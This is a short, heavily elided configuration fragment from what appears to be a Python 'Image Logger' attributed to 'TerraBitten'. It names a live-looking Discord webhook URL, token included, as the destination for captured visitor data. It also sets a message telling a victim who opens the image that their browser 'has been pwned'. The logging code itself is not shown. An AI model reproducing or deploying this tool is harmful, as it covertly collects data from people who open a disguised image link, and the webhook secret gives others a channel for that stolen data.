...
# By TerraBitten | https://github.com/TerraBitten
...
__version__ = "v2.0"
__author__ = "TerraBitten"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1394156750500008068/IrQ13NSJkYpisthlLYixSMH7PssNC_f7YXSqWc_Zmv99ACD0C7iNpT6WBGV7hyecC93G",
    ...
    "message": { # Show a custom message when the user opens the image
        ...
        "message": "This browser has been pwned by TerraBitten's Image Logger. https://github.com/xdexty0/Discord-Image-Logger", # Message to show
